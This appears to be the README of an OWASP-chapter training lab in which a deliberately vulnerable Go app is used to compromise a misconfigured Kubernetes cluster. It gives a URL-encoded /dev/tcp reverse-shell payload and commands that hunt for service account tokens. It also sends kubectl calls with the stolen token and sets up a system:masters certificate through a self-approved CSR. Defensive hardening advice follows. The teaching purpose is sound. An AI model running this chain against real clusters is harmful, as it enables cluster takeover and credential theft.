#  Welcome!

First and foremost, Welcome! :tada::confetti_ball:

Thank you for visiting the go-rce-kubernetes project repository. :balloon::balloon::balloon:

This document (the README file) is a hub to give you some information about the project. Jump straight to one of the sections below, or just scroll down to find out more.

* [What are we doing? (And why?)](#what-are-we-doing)
* [Who are we?](#who-are-we)
* [How to use this repostory](#getting-started)
* [Get in touch](#contact-us)
* [Find out more](#general-security-guidance)


## What are we doing?

The intent of this repository is to take a closer look at some of the security pitfals that maybe encoutered when deploying containerize applications in kubernetes. This project uses poorly writen go application to demonstrate how a single vulnerable application can compromise a poorly configured kubernetes cluster. 


## Who are we?

The new OWASP waterloo chapter leads and security enthustists
* Scott Handfield
* Kristopher Jamison
* Dale Babiy
* Deepak Sharma


# Getting started

## Pre-requisites 
This project assumes you have access to a running kubernetes cluster 

## Build and run 
The following steps outline building and running the simulations: 
1. Clone the repo 
```
git clone github.com/handfields/go-rce-kubernetes
```
2. Build the vulnerable go-rce contianer (Optional - containers are also available on dockerhub)
```
cd go-rce-kubernetes && docker build . 
```
3. Deploy 
4. Exploit 
 - The go-rce applicaion takes untrusted data from users as command line arguments and redirect
 - Open a browser to the following link (Replace hostname and port with the external IP/port of the kubernetes service) <br>
 [http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2Fhostname9%2Fport%200%3E%261](http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2Fhostname%2Fport%200%3E%261)

5. Recon
 - what information can you find that might be useful for lateral movement and/or persistence in the cluster? 
 - service account tokens? 
    ```
    find / -name '*token'
    ```
 - sensitive environment variables? 
   ```
   env
   ``` 
 - explore ..
    ```
    ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server='https://kubernetes.default.svc.cluster.local' get pods
    ```

6. Elevate permissions 

Generate and sign client certificate with elevated permissions
```
curl -Lo cfssl https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssl_1.5.0_linux_amd64 && chmod 700 cfssl 
curl -Lo cfssljson https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssljson_1.5.0_linux_amd64 && chmod 700 cfssljson

cat <<EOF | ./cfssl genkey - | ./cfssljson -bare server
{
  "CN": "admin",
  "names": [
      {
        "O": "system:masters"
      }
  ],
  "key": {
    "algo": "rsa",
    "size": 2048
  }
}
EOF

cat <<EOF | ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt apply -f -
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: nothing-to-see-here
spec:
  signerName: kubernetes.io/legacy-unknown
  request: $(cat server.csr | base64 | tr -d '\n')
  usages:
  - digital signature
  - key encipherment
  - client auth
EOF

./kubectl certificate approve nothing-to-see-here

./kubectl get csr nothing-to-see-here -o jsonpath='{.status.certificate}' | base64 -d | tee server.crt 
```

7. Perform lateral movement

8. Add security policies 

9. Update deployment 


# General secuirty guidance 
This section introduces some general best practice guildlines for operating secure containerize workloads 

### Build secure images 
    - Use slim and minimal base images, where possible 
    - Use multi-stage builds to avoid adding unnecessary binaries, libraries, files, etc. 
    - Scan images and applications for security vulnerabilities

### Ensure binary authorization
    - Restrict access to container registries and use only verified images (ie. Cryptographically signed images, OPA policies, etc. )

### Remove unnecessary capabilities 
    - Ensure securityContext is applied to ensure pods are running as non-root, with appropriate capabilities and read-only filesystems where possible.  

### Apply least privilege access 
    - Apply RBAC policy and limit access to service accounts 

### Take caution with sensitive mount points
    - Avoid mounting service account tokens and 'hostpath', especially for pods that are exposed to lower environments (ie. internet facing, accessible form uat, dev, etc..)

### Segment, Segment and Segment 
    - Namespaces
        - Use namespaces to logically group workloads but do not assume namespaces provide sufficient workload isolation. 
    - Network policies
    - Service mesh 
    - Secure control plane 

### Monitor
    - Continuously scan host, images and running containers for vulnerabilities and configuration issues 
    - Ensure logs are being shipped and analyzed for security issues

### Additional guidance, helpful tools and resources 
https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html<br>
https://github.com/OWASP/Docker-Security<br>
https://www.nist.gov/publications/application-container-security-guide <br>
https://github.com/open-policy-agent/<br>
https://github.com/ManicodeSecurity/Defending-DevOps <br>
https://github.com/ksoclabs/kube-goat <br>
https://github.com/aquasecurity<br>
https://github.com/falcosecurity/falco<br>
https://github.com/cyberark/KubiScan<br>
https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/<br>
https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/<br>
https://github.com/trailofbits/audit-kubernetes/tree/master/reports<br>
https://blog.aquasec.com/container-vulnerability-dzmlt-dynamic-container-analysis<br>